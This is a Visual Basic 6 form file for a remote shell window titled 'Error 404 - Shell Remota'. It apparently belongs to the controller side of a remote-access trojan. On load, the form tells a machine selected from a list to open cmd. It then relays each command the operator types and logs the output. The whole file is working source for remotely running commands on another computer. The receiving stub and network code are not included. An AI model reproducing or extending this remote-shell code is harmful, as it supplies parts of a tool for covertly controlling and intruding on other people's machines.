VERSION 5.00
Begin VB.Form frmShell 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Error 404 - Shell Remota"
   ClientHeight    =   4500
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   9960
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "frmShell.frx":0000
   ScaleHeight     =   4500
   ScaleWidth      =   9960
   StartUpPosition =   2  'CenterScreen
   Begin VB.TextBox txtSend 
      Height          =   285
      Left            =   0
      TabIndex        =   1
      Top             =   4200
      Width           =   9975
   End
   Begin VB.TextBox txtLog 
      BackColor       =   &H00000000&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000000&
      Height          =   4200
      Left            =   0
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   0
      Width           =   9975
   End
End
Attribute VB_Name = "frmShell"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Dim cmd() As String, Delimeter As Integer
'me.height = 5115 & 4860

Private Sub SendCommand()
Send "cCommand|" & txtSend.Text
End Sub

Private Sub txtLog_KeyPress(KeyAscii As Integer)
txtLog.Locked = False
cmd() = Split(txtLog.Text, ">")
    If KeyAscii = 13 Then
        KeyAscii = 0
        Send "cCommand|" & cmd(Delimeter)
            If cmd(Delimeter) = "cmd" Then
                Delimeter = Delimeter + 2
            Else
                Delimeter = Delimeter + 1
            End If
    ElseIf KeyAscii = 8 Then
            If cmd(Delimeter) = "" Then
                txtLog.Locked = True
            End If
    End If
End Sub

Private Sub txtSend_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
KeyAscii = 0
txtLog.Text = txtLog.Text & txtSend.Text
Call SendCommand
txtSend.Text = ""
End If
End Sub

Private Sub Form_Load()
Me.Caption = "Error 404 - Shell Remota [" & frmMain.LV.SelectedItem & "]"
txtLog.Text = ""
Delimeter = 2
Send "cCommand|" & "cmd"
End Sub
